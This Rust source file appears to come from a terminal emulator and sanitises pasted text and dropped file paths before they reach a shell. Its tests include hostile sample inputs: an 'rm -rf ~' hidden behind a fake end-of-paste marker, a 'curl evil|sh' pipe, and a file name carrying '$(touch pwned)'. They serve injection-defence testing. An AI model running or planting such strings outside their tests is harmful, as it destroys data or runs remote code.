//! 붙여넣기·파일 드롭이 PTY에 보낼 바이트(MK-033).

use krill_proto::term_modes::Modes;

const PASTE_START: &[u8] = b"\x1b[200~";
const PASTE_END: &[u8] = b"\x1b[201~";

// Windows input-record policy follows Orca terminal-bracketed-paste.ts and
// tui-agent-config.ts (MIT, Copyright (c) 2026 Lovecast Inc.).
/// Input consumer identified from the pane's launch metadata, never its title.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum InputPolicy {
    #[default]
    ByteStream,
    WindowsCodex,
    WindowsPi,
}

/// Native Codex reads input records: paste markers become visible keys and a
/// bare newline submits. Encode line breaks as Alt+Enter without bracket markers.
pub fn paste_with_policy(text: &[u8], modes: Modes, policy: InputPolicy) -> Vec<u8> {
    if policy != InputPolicy::WindowsCodex {
        return paste(text, modes);
    }
    let mut out = Vec::with_capacity(text.len());
    let mut it = text.iter().peekable();
    while let Some(&b) = it.next() {
        if b == b'\r' || b == b'\n' {
            if b == b'\r' && it.peek() == Some(&&b'\n') {
                it.next();
            }
            out.extend_from_slice(b"\x1b\r");
        } else if b == b'\t' || b >= 0x20 && b != 0x7f {
            out.push(b);
        }
    }
    out
}

/// 붙여넣을 텍스트 → PTY 바이트.
///
/// - bracketed paste 모드면 `ESC[200~`…`ESC[201~`로 감싼다. 본문의 ESC와 `^C`는 지운다: 본문이 끝 표시를 흉내 내
///   나머지를 명령으로 실행시키거나, 붙여넣기 도중 프로그램을 끊지 못하게.
/// - 아니면 줄바꿈(`\r\n`·`\n`)을 Enter와 같은 `\r`로 바꾼다. AS-13: 나머지 C0 제어문자
///   (`^U`·`^O` 등)와 DEL은 버린다 — bash 3.2 등에서 줄 편집 명령으로 실행된다. `\t`는 살린다.
pub fn paste(text: &[u8], modes: Modes) -> Vec<u8> {
    if modes.contains(Modes::BRACKETED_PASTE) {
        let mut out = PASTE_START.to_vec();
        out.extend(text.iter().filter(|&&b| b != 0x1b && b != 0x03));
        out.extend_from_slice(PASTE_END);
        return out;
    }
    let mut out = Vec::with_capacity(text.len());
    let mut it = text.iter().peekable();
    while let Some(&b) = it.next() {
        if b == b'\r' && it.peek() == Some(&&b'\n') {
            continue;
        }
        if b == b'\n' {
            out.push(b'\r');
        } else if b == b'\t' || b == b'\r' || b >= 0x20 && b != 0x7f {
            out.push(b);
        }
    }
    out
}

/// Shell syntax is independent of the computer running the UI.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum ShellFamily {
    #[default]
    Posix,
    PowerShell,
    Cmd,
    /// Local Windows login shell was not advertised. Use only syntax that is
    /// literal in both cmd and PowerShell; reject expansion characters.
    WindowsUnknown,
    /// Remote shell is unknown. Only unquoted, universally plain paths are safe.
    Unknown,
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct DropPolicy {
    pub shell: ShellFamily,
    pub image_attachments: bool,
}

pub fn is_image_path(path: &[u8]) -> bool {
    let name = path
        .rsplit(|b| *b == b'/' || *b == b'\\')
        .next()
        .unwrap_or_default();
    let ext = name.rsplit(|b| *b == b'.').next().unwrap_or_default();
    name.contains(&b'.')
        && [
            b"png".as_slice(),
            b"jpg",
            b"jpeg",
            b"gif",
            b"webp",
            b"bmp",
            b"tif",
            b"tiff",
        ]
        .iter()
        .any(|candidate| ext.eq_ignore_ascii_case(candidate))
}

pub fn quote_path(path: &[u8], shell: ShellFamily) -> Option<Vec<u8>> {
    if path.iter().any(|b| *b < 0x20 || *b == 0x7f) {
        return None;
    }
    match shell {
        ShellFamily::Posix => Some(shell_quote(path)),
        ShellFamily::PowerShell => {
            let mut out = vec![b'\''];
            for &b in path {
                out.push(b);
                if b == b'\'' {
                    out.push(b);
                }
            }
            out.push(b'\'');
            Some(out)
        }
        ShellFamily::Cmd | ShellFamily::WindowsUnknown => {
            let forbidden: &[u8] = if shell == ShellFamily::Cmd {
                b"\"%!"
            } else {
                b"\"%!$`"
            };
            if path.iter().any(|b| forbidden.contains(b)) {
                return None;
            }
            Some([b"\"", path, b"\""].concat())
        }
        ShellFamily::Unknown => (!path.is_empty()
            && path
                .iter()
                .all(|b| b.is_ascii_alphanumeric() || b"/._-+,:=".contains(b)))
        .then(|| path.to_vec()),
    }
}

// Image attachment formatting follows Orca terminal-drop-image-path.ts,
// MIT License, Copyright (c) 2026 Lovecast Inc.
/// Image TUIs parse attachment paths, not shell argument splice expressions.
pub fn dropped_with_policy<'a>(
    paths: impl IntoIterator<Item = &'a [u8]>,
    policy: DropPolicy,
) -> Option<Vec<u8>> {
    let paths: Vec<_> = paths.into_iter().collect();
    let attachments = policy.image_attachments
        && !paths.is_empty()
        && paths.iter().all(|path| is_image_path(path));
    let mut out = Vec::new();
    for (index, path) in paths.iter().enumerate() {
        if index > 0 {
            out.push(b' ');
        }
        if attachments && policy.shell == ShellFamily::Posix {
            if path.iter().any(|b| *b < 0x20 || *b == 0x7f) {
                return None;
            }
            for &b in *path {
                if !(b.is_ascii_alphanumeric() || b >= 0x80 || b"_./@:-".contains(&b)) {
                    out.push(b'\\');
                }
                out.push(b);
            }
        } else {
            let shell = if attachments && policy.shell == ShellFamily::PowerShell {
                ShellFamily::WindowsUnknown
            } else {
                policy.shell
            };
            out.extend(quote_path(path, shell)?);
        }
    }
    if !attachments && !paths.is_empty() {
        out.push(b' ');
    }
    Some(out)
}

/// 경로 하나를 셸 인자 하나로. 흔한 안전 글자만이면 그대로, 아니면 작은따옴표로 감싸고 안의 `'`는 `'\''`로.
/// sh·bash·zsh 모두 작은따옴표 안을 글자 그대로 읽는다.
pub fn shell_quote(path: &[u8]) -> Vec<u8> {
    let safe = |b: &u8| b.is_ascii_alphanumeric() || b"/._-+,:@%=".contains(b);
    if !path.is_empty() && path.iter().all(safe) {
        return path.to_vec();
    }
    let mut out = vec![b'\''];
    for &b in path {
        if b == b'\'' {
            out.extend_from_slice(b"'\\''");
        } else {
            out.push(b);
        }
    }
    out.push(b'\'');
    out
}

/// 드롭한 경로들 → 셸 인자를 공백으로 이은 텍스트(끝에 공백 하나, 이어서 칠 수 있게). [`paste`]로 보낸다.
pub fn dropped<'a>(paths: impl IntoIterator<Item = &'a [u8]>) -> Vec<u8> {
    let mut out = Vec::new();
    for p in paths {
        out.extend(shell_quote(p));
        out.push(b' ');
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(unix)]
    use krill_proto::os::ffi::OsStrExt as _;
    #[cfg(unix)]
    use std::process::Command;

    #[test]
    fn native_input_record_paste_encodes_all_line_endings_without_markers() {
        for flags in [0, Modes::BRACKETED_PASTE] {
            let modes = Modes { kitty: 0, flags };
            assert_eq!(
                paste_with_policy(b"A\r\nB\nC\rD", modes, InputPolicy::WindowsCodex),
                b"A\x1b\rB\x1b\rC\x1b\rD"
            );
            assert_eq!(
                paste_with_policy(b"a\x1b[201~\x03\x15\x7fb", modes, InputPolicy::WindowsCodex),
                b"a[201~b"
            );
        }
        assert_eq!(
            paste_with_policy(b"A\nB", bracketed(), InputPolicy::ByteStream),
            b"\x1b[200~A\nB\x1b[201~"
        );
    }

    #[test]
    fn shell_families_and_unknown_fallback_never_expand_path_text() {
        let path = br"C:\tmp\it's (a b).txt";
        assert_eq!(
            quote_path(path, ShellFamily::PowerShell).unwrap(),
            br"'C:\tmp\it''s (a b).txt'"
        );
        for family in [ShellFamily::Cmd, ShellFamily::WindowsUnknown] {
            assert_eq!(
                quote_path(path, family).unwrap(),
                br#""C:\tmp\it's (a b).txt""#
            );
            assert!(quote_path(br"C:\%TEMP%\a.txt", family).is_none());
            assert!(quote_path(br"C:\!danger!\a.txt", family).is_none());
        }
        assert!(quote_path(br"C:\$env:TEMP\x", ShellFamily::WindowsUnknown).is_none());
        assert!(quote_path(b"a\nb", ShellFamily::Posix).is_none());
        assert!(quote_path(b"/tmp/a b", ShellFamily::Unknown).is_none());
        assert_eq!(
            quote_path(b"/tmp/plain.png", ShellFamily::Unknown).unwrap(),
            b"/tmp/plain.png"
        );
    }

    #[test]
    fn image_attachments_have_no_shell_quote_splice_or_trailing_space() {
        let policy = DropPolicy {
            shell: ShellFamily::Posix,
            image_attachments: true,
        };
        assert_eq!(
            dropped_with_policy([b"/tmp/it's (a b).PNG".as_slice()], policy).unwrap(),
            br"/tmp/it\'s\ \(a\ b\).PNG"
        );
        assert_eq!(
            dropped_with_policy([b"/a.png".as_slice(), b"/b.jpg"], policy).unwrap(),
            b"/a.png /b.jpg"
        );
        assert_eq!(
            dropped_with_policy([b"/a.png".as_slice(), b"/b.txt"], policy).unwrap(),
            b"/a.png /b.txt "
        );
        assert!(dropped_with_policy([b"/a\n.png".as_slice()], policy).is_none());
        assert!(!is_image_path(b"/folder.png/plain"));
    }

    #[cfg(windows)]
    #[test]
    fn quoted_paths_roundtrip_native_windows_shells() {
        let dir = std::env::temp_dir().join(format!("krill-input-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        for name in ["a b.txt", "it's (x).txt", "cash$`&^.txt", "한글.txt"] {
            let path = dir.join(name);
            std::fs::write(&path, b"literal-path").unwrap();
            let path = path.to_str().unwrap().as_bytes();
            for (shell, family) in [
                ("cmd.exe", ShellFamily::Cmd),
                ("powershell.exe", ShellFamily::PowerShell),
            ] {
                let quoted = String::from_utf8(quote_path(path, family).unwrap()).unwrap();
                let mut cmd = Command::new(shell);
                if family == ShellFamily::Cmd {
                    cmd.args(["/D", "/V:OFF", "/C", &format!("type {quoted}")]);
                } else {
                    cmd.args([
                        "-NoProfile",
                        "-NonInteractive",
                        "-Command",
                        &format!("[IO.File]::ReadAllText({quoted})"),
                    ]);
                }
                let output = cmd.output().unwrap();
                assert!(output.status.success(), "{shell}: {output:?}");
                assert_eq!(
                    String::from_utf8_lossy(&output.stdout).trim(),
                    "literal-path",
                    "{shell}"
                );
            }
        }
        std::fs::remove_dir_all(dir).unwrap();
    }

    fn bracketed() -> Modes {
        Modes {
            kitty: 0,
            flags: Modes::BRACKETED_PASTE,
        }
    }

    #[test]
    fn bracketed_wraps_and_strips_escape_and_ctrl_c() {
        assert_eq!(
            paste(b"ls\n\x1b[201~rm -rf ~\x03\n", bracketed()),
            b"\x1b[200~ls\n[201~rm -rf ~\n\x1b[201~"
        );
        assert_eq!(paste(b"a\r\nb\nc\rd", Modes::default()), b"a\rb\rc\rd");
    }

    #[test]
    fn quote_rules() {
        assert_eq!(shell_quote(b"/tmp/a-b_c.txt"), b"/tmp/a-b_c.txt");
        assert_eq!(shell_quote(b"/tmp/a b"), b"'/tmp/a b'");
        assert_eq!(shell_quote(b"it's"), b"'it'\\''s'");
        assert_eq!(shell_quote(b""), b"''");
        assert_eq!(dropped([&b"/a"[..], b"/b c"]), b"/a '/b c' ");
    }

    /// AS-13: bracketed paste가 꺼진 상태에서는 C0 제어문자를 버린다.
    /// 파일명·텍스트의 `^U`(줄 지움)·`^O` 등이 bash 줄 편집 명령으로 실행되는 것을 막는다.
    /// `\t`·`\n`·`\r`은 살리고, DEL(지움)도 버린다.
    #[test]
    fn unbracketed_strips_c0_controls() {
        assert_eq!(
            paste(b"/tmp/x\x15curl evil|\x0fsh\x07", Modes::default()),
            b"/tmp/xcurl evil|sh"
        );
        assert_eq!(paste(b"a\x7fb", Modes::default()), b"ab");
        assert_eq!(paste(b"a\tb\nc\rd", Modes::default()), b"a\tb\rc\rd");
    }

    /// 완료 조건: 공백·따옴표(와 셸 특수 문자·한글)가 든 경로를 드롭한 텍스트가 셸에서 그 파일들로 열린다.
    #[cfg(unix)]
    #[test]
    fn dropped_paths_open_in_shells() {
        let dir = std::env::temp_dir().join(format!("mk033 drop '\"{}", std::process::id()));
        std::fs::remove_dir_all(&dir).ok();
        std::fs::create_dir_all(&dir).unwrap();
        let names = [
            "a b.txt",
            "it's.txt",
            "say \"hi\".txt",
            "$(touch pwned) `x` *;&|.txt",
            "한글 파일.txt",
            "plain.txt",
        ];
        let paths: Vec<_> = names.iter().map(|n| dir.join(n)).collect();
        for (i, p) in paths.iter().enumerate() {
            std::fs::write(p, format!("{i};")).unwrap();
        }
        let args = dropped(paths.iter().map(|p| p.as_os_str().as_bytes()));
        let want: String = (0..names.len()).map(|i| i.to_string() + ";").collect();
        let script = [&b"cat "[..], &args].concat();
        let script = std::str::from_utf8(&script).unwrap();
        for shell in ["/bin/sh", "/bin/bash", "/bin/zsh"] {
            if !std::path::Path::new(shell).exists() {
                continue;
            }
            let out = Command::new(shell)
                .args(["-c", script])
                .current_dir(&dir)
                .output()
                .unwrap();
            assert!(out.status.success(), "{shell}: {out:?}");
            assert_eq!(String::from_utf8_lossy(&out.stdout), want, "{shell}");
        }
        assert!(!dir.join("pwned").exists());
        std::fs::remove_dir_all(&dir).ok();
    }
}
